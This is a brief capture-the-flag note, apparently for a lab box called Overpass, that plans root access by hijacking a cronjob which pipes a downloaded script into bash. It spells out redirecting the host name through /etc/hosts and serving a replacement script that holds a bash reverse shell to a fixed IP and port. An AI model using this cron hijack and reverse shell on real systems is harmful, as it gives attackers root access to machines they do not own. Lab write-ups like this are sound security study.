what's happening -
---------------------

1. linpeas.sh	-->	found cronjob	-->	* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
2. downloaded this buildscript.sh on local machine
3. the target machine is triggering the localhost to download the buildscript.sh content and write it to bash


what we have to do -
----------------------
1. write our attackr machine's ip to	-->	/etc/hosts
2. since the buildscript.sh file is in '/downloads/src/' path, we will make the same path and will host our own malicious buildscript.sh there with a reverse shell in it
3. write - 'bash -i >& /dev/tcp/10.8.118.82/4242 0>&1' to the buildscript.sh and listen for incomming connection on attacker's machine
4. start the python server and wait for incomming connection
